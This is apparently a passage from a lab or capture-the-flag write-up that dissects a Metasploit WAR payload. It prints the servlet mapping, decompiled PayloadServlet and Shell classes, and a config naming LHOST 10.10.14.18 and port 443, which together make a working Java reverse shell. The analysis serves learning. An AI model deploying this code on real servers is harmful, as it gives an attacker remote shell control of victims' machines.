   creating: WEB-INF/classes/metasploit/
  inflating: WEB-INF/classes/metasploit/Payload.class  
  inflating: WEB-INF/classes/metasploit/PayloadServlet.class  
replace WEB-INF/classes/metasploit/Payload.class? [y]es, [n]o, [A]ll, [N]one, [r]ename: r
new name: WEB-INF/classes/metasploit/Payload2.class
  inflating: WEB-INF/classes/metasploit/Payload2.class  
   creating: WEB-INF/classes/javapayload/
   creating: WEB-INF/classes/javapayload/stage/
  inflating: WEB-INF/classes/javapayload/stage/Stage.class  
  inflating: WEB-INF/classes/javapayload/stage/StreamForwarder.class  
  inflating: WEB-INF/classes/javapayload/stage/Shell.class  
  inflating: WEB-INF/classes/metasploit.dat  

```

It’s not clear to me why there are two copies of `Payload.class`. I renamed one of them and checked the hashes of each - they are the same.

The `web.xml` file tells the WAR where to start:

```

<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>pisrncupolel</servlet-name>
<servlet-class>metasploit.PayloadServlet</servlet-class>
</servlet>
<servlet-mapping>
<servlet-name>pisrncupolel</servlet-name>
<url-pattern>/*</url-pattern>
</servlet-mapping>
</web-app>

```

`servlet-class` defines what gets run when the WAR is visited, in this case `metasploit.PayloadServlet`. I’ll find that file at `WEB-INF/classes/metasploit/PayloadServlet.class`. I can decompile it back to Java with `procyon [path to class file]`:

```

package metasploit;

import java.io.IOException;
import javax.servlet.ServletException;
import java.io.PrintWriter;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServlet;

public class PayloadServlet extends HttpServlet implements Runnable
{
    public void run() {
        try {
            Payload.main(new String[] { "" });
        }
        catch (Exception ex) {}
    }
    
    protected void doGet(final HttpServletRequest httpServletRequest, final HttpServletResponse httpServletResponse) throws ServletException, IOException {
        final PrintWriter writer = httpServletResponse.getWriter();
        try {
            new Thread(this).start();
        }
        catch (Exception ex) {}
        writer.close();
    }
}

```

The `run` function is what gets run, and it calls `Payload.main`. In that same directory, there’s a `Payload.class`, which is the guts for the reverse shell. At the start of `main`, it gets `/metasploit.dat` as a resource file:

```

    public static void main(final String[] array) throws Exception {
        final Properties properties = new Properties();
        final Class<Payload> clazz = Payload.class;
        final String string = clazz.getName().replace('.', '/') + ".class";
        final InputStream resourceAsStream = clazz.getResourceAsStream("/metasploit.dat");

```

This file defines the `LHOST`, `LPORT`, and the `EmbeddedStage`:

```

LHOST=10.10.14.18
LPORT=443
EmbeddedStage=Shell

```

The main function handles loading the next stage. Because I build my payload with the unstaged payload `java/shell_reverse_tcp`, the payload itself is embedded into the WAR. If I build another one with `java/shell/reverse_tcp`, this would be a staged payload, bringing only the stub it needs to connect back to Metaploit and get the next stage. In that WAR, I find `metasploit.dat` doesn’t have an `EmbeddedStage`:

```

Spawn=2
LHOST=10.10.14.18
LPORT=443

```

Also, there is no `javapayload` directory.

Looking back at the unstaged payload, the last line in `main` calls `bootstrap` passing in the `EmbeddedStage` value.

```

new Payload().bootstrap(inputStream, (OutputStream)closeable, properties.getProperty("EmbeddedStage", null), array4);

```

Looking in `WEB-INF/classes/javapayload/stage/`, there’s a `Shell.class`, and it decompiles to:

```

package javapayload.stage;

import java.io.InputStream;
import java.io.OutputStream;
import java.io.DataInputStream;

public class Shell implements Stage
{
    public void start(final DataInputStream dataInputStream, final OutputStream outputStream, final String[] array) throws Exception {
        final String[] cmdarray = { null };
        if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) {
            cmdarray[0] = "cmd.exe";
        }
        else {
            cmdarray[0] = "/bin/sh";
        }
        final Process exec = Runtime.getRuntime().exec(cmdarray);
        new StreamForwarder(dataInputStream, exec.getOutputStream(), outputStream).start();
        new StreamForwarder(exec.getInputStream(), outputStream, outputStream).start();
        new StreamForwarder(exec.getErrorStream(), outputStream, outputStream).start();
        exec.waitFor();
        dataInputStream.close();
        outputStream.close();
    }
}

```

This is a pretty standard Java reverse shell.